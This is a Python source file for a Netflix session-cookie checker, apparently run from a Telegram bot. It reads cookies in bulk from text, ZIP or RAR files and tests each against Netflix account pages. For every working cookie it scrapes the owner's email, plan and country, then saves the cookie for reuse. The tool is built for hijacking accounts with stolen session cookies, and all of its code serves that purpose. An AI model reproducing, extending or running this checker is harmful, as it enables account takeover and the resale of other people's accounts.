import os
import json
import requests
import certifi
import re
import shutil
import uuid
import zipfile
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.cookies import SimpleCookie
from bs4 import BeautifulSoup
import hashlib
import rarfile

# --- Basic Setup ---
os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
stop_flag = False
SECURE_HTTPONLY_NAMES = {"NetflixId", "SecureNetflixId"}

# --- Thread-safe counters and a set for tracking saved emails ---
check_lock = threading.Lock()
valid_count = 0
invalid_count = 0
checked_count = 0
saved_emails = set()

# Global variable to store temp directory path
temp_results_dir = None

def log(text):
    """Simple logging function for console output"""
    print(text)

# --- Function to sanitize text for Telegram messages ---
def sanitize_for_telegram(text):
    """Remove or escape characters that cause Telegram entity parsing issues"""
    if not text:
        return "N/A"
    
    # Replace problematic characters
    text = str(text)
    text = text.replace('&', 'and')
    text = text.replace('<', '(')
    text = text.replace('>', ')')
    text = text.replace('[', '(')
    text = text.replace(']', ')')
    text = text.replace('*', '-')
    text = text.replace('_', '-')
    text = text.replace('`', "'")
    text = text.replace('|', '-')
    
    # Remove any control characters
    text = ''.join(char for char in text if ord(char) >= 32 or char in '\n\r\t')
    
    return text.strip() if text.strip() else "N/A"

# --- NEW: Function to scan the output folder for existing emails ---
def get_emails_from_folder(folder_path):
    """Scans the valid cookies folder and extracts emails from filenames."""
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        return set()

    existing_emails = set()
    # Regex to safely extract the email from the filename format: [Country][Email][Plan]...
    email_pattern = re.compile(r'\[([^\]]+)\]\[([^\]]+@[^\]]+)\]')
    
    for filename in os.listdir(folder_path):
        match = email_pattern.search(filename)
        if match:
            email = match.group(2)
            existing_emails.add(email)
            
    return existing_emails

# --- New, Self-Contained Plan Extraction Function ---
def extract_netflix_plan(html_content: str) -> str:
    """
    Extracts the Netflix plan name from the HTML content of the account page.
    It tries multiple methods in a specific order to handle different layouts.
    """
    plan = "Unknown"  # Default value

    # --- Attempt 1: Primary Method (Fast but specific string splitting) ---
    try:
        plan = html_content.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
        if plan: 
            return sanitize_for_telegram(plan.strip())
    except IndexError:
        pass

    # --- Attempt 2: Fallback using BeautifulSoup (More robust parsing) ---
    try:
        soup = BeautifulSoup(html_content, "html.parser")
        h3_tag = soup.find('h3', class_='default-ltr-cache-10ajupv e19xx6v32')
        if h3_tag and h3_tag.text:
            return sanitize_for_telegram(h3_tag.text.strip())
        
        h3_tag_robust = soup.find('h3', class_=lambda c: c and 'card+title' in c)
        if h3_tag_robust and h3_tag_robust.text:
            return sanitize_for_telegram(h3_tag_robust.get_text(strip=True))

    except Exception:
        pass

    # --- Attempt 3: Final String Splitting Fallback ---
    try:
        plan = html_content.split('<div class="account-section-item" data-uia="plan-label">')[1].split("</p><p>")[0].split('<p class="beneficiary-header">')[1].replace(":", "")
        if plan: 
            return sanitize_for_telegram(plan.strip())
    except IndexError:
        pass

    return sanitize_for_telegram(plan if plan != "Unknown" else "NULL")

# --- Main Checker Class with Revised Logic ---
class NetflixCookieChecker:
    """
    Handles the validation of Netflix cookies and extraction of account information.
    """
    def get_country_name(self, country_code):
        country_map = {
            'US': 'USA', 'CA': 'Canada', 'GB': 'UK', 'DE': 'Germany', 'FR': 'France',
            'IT': 'Italy', 'ES': 'Spain', 'AU': 'Australia', 'JP': 'Japan',
            'BR': 'Brazil', 'MX': 'Mexico', 'IN': 'India', 'NL': 'Netherlands'
        }
        return country_map.get(country_code.upper(), country_code)

    def get_email_from_security_page(self, headers, cookies):
        try:
            response = requests.get("https://www.netflix.com/account/security", headers=headers, cookies=cookies, timeout=10)
            pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
            matches = re.findall(pattern, response.text)
            return sanitize_for_telegram(matches[0]) if matches else None
        except Exception:
            return None
            
    def validate_and_get_info(self, cookie_dict):
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }

        try:
            login_check_response = requests.get(
                'https://www.netflix.com/ManageProfiles',
                headers=headers,
                cookies=cookie_dict,
                timeout=10
            )
            
            html = login_check_response.text.lower()
            url = login_check_response.url.lower()
            
            # 1️⃣ Invalid if redirected or "sign in" form present
            if "login" in url or "sign in" in html or "sign in to netflix" in html:
                return False, {"error": "Invalid Cookie (Login Failed)"}
            
            # 2️⃣ NEW: Profile selection page detection
            if "profilesgate" in url or 'data-uia="profile-button"' in html:
                log("👤 Profile selection detected, proceeding...")
                # just continue

        except requests.RequestException as e:
            return False, {"error": f"Connection Error: {e}"}

        info = {'email': 'N/A', 'plan': 'N/A', 'country': 'N/A', 'extra_member': 'false'}
        try:
            account_page_response = requests.get("https://www.netflix.com/YourAccount", headers=headers, cookies=cookie_dict, timeout=15)
            html = account_page_response.text

            # --- Email Extraction ---
            email = 'N/A'
            try:
                json_data_match = re.search(r'<script id="react-context" type="application/json">(.+?)</script>', html)
                if json_data_match:
                    react_context = json.loads(json_data_match.group(1))
                    email = react_context.get('models', {}).get('memberContext', {}).get('data', {}).get('email', 'N/A')
                if email == 'N/A': raise AttributeError
            except (AttributeError, json.JSONDecodeError, KeyError):
                log("Primary email extraction failed, using fallback.")
                email = self.get_email_from_security_page(headers, cookie_dict) or 'N/A'
            info['email'] = sanitize_for_telegram(email)
            
            # --- Plan Extraction using the new dedicated function ---
            info['plan'] = extract_netflix_plan(html)

            # --- Extract Country ---
            try:
                country_code = re.search(r'"currentCountry":"([^"]+)"', html).group(1)
                info['country'] = sanitize_for_telegram(self.get_country_name(country_code))
            except AttributeError:
                info['country'] = 'N/A'

            # --- Check for Extra Member slot ---
            info['extra_member'] = "True" if "addextramember" in html else "false"

            return True, info

        except requests.RequestException as e:
            log(f"Login valid, but failed to get account details: {e}")
            return True, info

# --- Initialize Checker ---
netflix_checker = NetflixCookieChecker()

# --- Cookie Parsing Functions ---
def _parse_cookie_header_format(cookie_str: str):
    if ' = ' in cookie_str and ';' not in cookie_str:
        cookie_str = cookie_str.replace(' = ', '=', 1)
    cookie = SimpleCookie()
    cookie.load(cookie_str)
    return {key: morsel.value for key, morsel in cookie.items()}

def parse_cookie_line(cookie_str: str):
    cookie_str = cookie_str.strip()
    if cookie_str.startswith('{'):
        try:
            data = json.loads(cookie_str)
            if isinstance(data, dict) and 'name' in data and 'value' in data:
                return {str(data['name']): str(data['value'])}
        except: pass
    return _parse_cookie_header_format(cookie_str)

def parse_netscape_format(file_content: str):
    cookies = {}
    for line in file_content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'): continue
        try:
            parts = line.split('\t')
            if len(parts) == 7: cookies[parts[5]] = parts[6]
        except: continue
    return cookies if cookies else None

def parse_input_to_cookie_list(file_content: str):
    content = file_content.strip()
    if not content: return []
    lines = content.splitlines()
    first_line = lines[0].strip()

    if first_line.startswith('NetflixId'):
        log("Detected 'NetflixId' start: Processing line-by-line.")
        return [d for d in (parse_cookie_line(line) for line in lines) if d]
    elif first_line.startswith('['):
        log("Detected '[' start: Processing as a single JSON array.")
        try:
            data = json.loads(content)
            cookie_dict = {str(i['name']): str(i['value']) for i in data if 'name' in i and 'value' in i}
            return [cookie_dict] if cookie_dict else []
        except:
            log("Error: Failed to parse JSON array.")
            return []
    elif first_line.startswith('.') or first_line.startswith('# Netscape'):
        log("Detected Netscape format.")
        cookie_dict = parse_netscape_format(content)
        return [cookie_dict] if cookie_dict else []
    else:
        log("No specific format detected, attempting simple Key=Value parsing.")
        return [d for d in (parse_cookie_line(line) for line in lines) if d]

def _save_valid_cookie_with_info(cookie_dict, info):
    global temp_results_dir
    # Sanitize filename components
    country = sanitize_for_telegram(info.get('country', 'N/A'))
    email = sanitize_for_telegram(info.get('email', 'N/A'))
    plan = sanitize_for_telegram(info.get('plan', 'NULL'))
    extra_member = sanitize_for_telegram(info.get('extra_member', 'false'))
    
    filename = f"[{country}][{email}][{plan}][{extra_member}].txt"
    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
    
    # Use temp directory instead of fixed directory
    valid_dir = os.path.join(temp_results_dir, 'valid_cookies')
    os.makedirs(valid_dir, exist_ok=True)
    output_path = os.path.join(valid_dir, filename)
    
    payload = []
    for name, value in cookie_dict.items():
        secure = name in SECURE_HTTPONLY_NAMES
        http_only = name in SECURE_HTTPONLY_NAMES
        payload.append({"name": name, "value": value, "domain": ".netflix.com", "path": "/", "secure": secure, "httpOnly": http_only})

    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(payload, f, ensure_ascii=False, separators=(',', ': '))
    
    return output_path

def _save_invalid_cookie(cookie_dict, error_message, source_filename="unknown_source", original_content=""):
    """
    Saves an invalid cookie to the invalid_cookies directory in temp folder.
    Keeps the original format and filename unchanged.
    """
    global temp_results_dir
    # Get just the base filename (e.g., "1.txt" from "/path/to/1.txt")
    filename = os.path.basename(source_filename)
    
    # Sanitize the filename to be safe for file paths
    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
    
    invalid_dir = os.path.join(temp_results_dir, 'invalid_cookies')
    os.makedirs(invalid_dir, exist_ok=True)
    output_path = os.path.join(invalid_dir, filename)

    # If we have original content, use it; otherwise create from cookie_dict
    if original_content:
        # Save the original content as-is
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(original_content)
    else:
        # Fallback: create simple cookie format
        with open(output_path, 'w', encoding='utf-8') as f:
            for name, value in cookie_dict.items():
                f.write(f"{name}={value};\n")
    
    return output_path

def process_single_cookie(cookie_dict, total_cookies, source_filename="unknown_source", original_content=""):
    """Worker function to process one cookie dictionary."""
    global valid_count, invalid_count, checked_count
    if stop_flag:
        return

    is_valid, info = netflix_checker.validate_and_get_info(cookie_dict)
    
    with check_lock:
        checked_count += 1
        if is_valid:
            email = info.get('email', 'N/A')
            
            # Check if the account was already saved in this run or from a previous run
            if email != 'N/A' and email in saved_emails:
                # This is an existing account, so we are updating it.
                path = _save_valid_cookie_with_info(cookie_dict, info)
                log(f"🔄 UPDATED: Refreshed cookie for {email}")
            else:
                # This is a brand new valid account.
                valid_count += 1
                if email != 'N/A':
                    saved_emails.add(email)
                
                path = _save_valid_cookie_with_info(cookie_dict, info)
                log(f"💾 NEW: {os.path.basename(path)}")
        else:
            invalid_count += 1
            error_msg = info.get('error', 'Unknown error')
            # Save invalid cookie with original content
            _save_invalid_cookie(cookie_dict, error_msg, source_filename, original_content) 
            log(f"❌ INVALID: {error_msg} (from {os.path.basename(source_filename)})")

        # Update progress
        progress = checked_count / total_cookies
        log(f'Progress: {checked_count}/{total_cookies} | Valid: {valid_count} | Invalid: {invalid_count}')

# --- Store original content for invalid cookies ---
original_file_contents = {}

# --- REVISED: run_check_on_file_list supports live yields ---
def run_check_on_file_list(file_paths, live=False):
    """
    Reads a list of .txt files, parses all cookies, and then runs the checker.
    This is the main orchestrator for the checking process.
    """
    global temp_results_dir, stop_flag, valid_count, invalid_count, checked_count, saved_emails, original_file_contents
    
    # Initialize counters
    stop_flag = False
    valid_count, invalid_count, checked_count = 0, 0, 0
    saved_emails = set()
    original_file_contents = {}
    
    # Create temporary directory for results
    temp_results_dir = f"temp_results_{uuid.uuid4().hex}"
    os.makedirs(temp_results_dir, exist_ok=True)
    
    all_cookies_to_check = []
    cookies_with_sources = [] 

    for file_path in file_paths:
        if stop_flag:
            log("🛑 Process stopped by user during file reading.")
            break
        try:
            log(f"📖 Reading file: {os.path.basename(file_path)}")
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Store original content for this file
            original_file_contents[file_path] = content
            
            cookies_from_file = parse_input_to_cookie_list(content)
            if cookies_from_file:
                log(f"  -> Found {len(cookies_from_file)} cookie(s) in this file.")
                for cookie_dict in cookies_from_file:
                    cookies_with_sources.append((cookie_dict, file_path))
            else:
                log(f"  -> No valid cookie formats found in this file.")

        except Exception as e:
            log(f"  -> ❌ Error reading or parsing file {os.path.basename(file_path)}: {e}")
            continue
    
    total_to_check = len(cookies_with_sources)
    if total_to_check == 0:
        log('No valid cookies found in the provided file(s).')
        if live:
            yield (checked_count, total_to_check, valid_count, invalid_count, temp_results_dir)
        return temp_results_dir

    log(f'Found a total of {total_to_check} cookies to check across all files.')

    try:
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {
                executor.submit(
                    process_single_cookie, 
                    c_dict, 
                    total_to_check, 
                    s_path, 
                    original_file_contents.get(s_path, "")
                ): (c_dict, s_path) 
                for c_dict, s_path in cookies_with_sources
            }
            for future in as_completed(futures):
                if stop_flag:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                future.result()
                if live:
                    yield (checked_count, total_to_check, valid_count, invalid_count)

        if stop_flag:
            log('⏹️ Checking stopped by user.')
        else:
            log('🎉 Done checking all cookies.')
            log(f'Final Results: Valid: {valid_count} | Invalid: {invalid_count}')

    except Exception as e:
        log(f'Error during check: {e}')
    
    if live:
        yield (checked_count, total_to_check, valid_count, invalid_count, temp_results_dir)
    return temp_results_dir

# --- REVISED: process_file_and_check supports live yields ---
def process_file_and_check(input_file, live=False):
    """Handles file input, extracts archives if necessary, and starts the check."""
    log('⚙️ Starting process...')
    
    if not input_file or not os.path.exists(input_file):
        log('Error: Please select a valid file first.')
        if live:
            yield (0, 0, 0, 0, None)
        return None

    file_ext = os.path.splitext(input_file)[-1].lower()
    txt_file_paths = []
    extract_dir = f"temp_extract_{uuid.uuid4().hex}"

    try:
        if file_ext == '.txt':
            log(f"Selected single text file: {os.path.basename(input_file)}")
            txt_file_paths.append(input_file)

        elif file_ext == '.zip':
            log(f"📦 ZIP archive detected. Extracting...")
            os.makedirs(extract_dir, exist_ok=True)
            with zipfile.ZipFile(input_file, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            log("✅ ZIP extracted. Searching for .txt files...")
            txt_file_paths = [os.path.join(root, filename) for root, _, files in os.walk(extract_dir) for filename in files if filename.endswith(".txt")]

        elif file_ext == '.rar':
            log(f"📦 RAR archive detected. Extracting...")
            try:
                rarfile.UNRAR_TOOL = "/usr/bin/unrar"
                os.makedirs(extract_dir, exist_ok=True)
                with rarfile.RarFile(input_file, 'r') as rar_ref:
                    rar_ref.extractall(extract_dir)
                log("✅ RAR extracted. Searching for .txt files...")
                txt_file_paths = [os.path.join(root, filename) for root, _, files in os.walk(extract_dir) for filename in files if filename.endswith(".txt")]
            except Exception as e:
                log(f"❌ Failed to extract RAR: {e}")
                if live:
                    yield (0, 0, 0, 0, None)
                return None
        
        else:
            log("Unsupported File: Please select a .txt, .zip, or .rar file.")
            if live:
                yield (0, 0, 0, 0, None)
            return None

        if not txt_file_paths:
            log("❌ No .txt files found to process.")
            if live:
                yield (0, 0, 0, 0, None)
            return None
        
        log(f"Found {len(txt_file_paths)} .txt file(s) to process.")
        results = run_check_on_file_list(txt_file_paths, live=live)
        if live:
            yield from results
        else:
            return results

    finally:
        # Clean up extraction directory
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)

# Main function to be called by telegram bot
def main(file_paths):
    """Main function to be called by the telegram bot"""
    if not file_paths:
        return None
    
    # Process the first file (assuming single file upload)
    results_dir = process_file_and_check(file_paths[0])
    return results_dir

if __name__ == "__main__":
    # Test with local file
    test_files = ["test_cookies.txt"]
    results = main(test_files)
    if results:
        print(f"Results saved to: {results}")




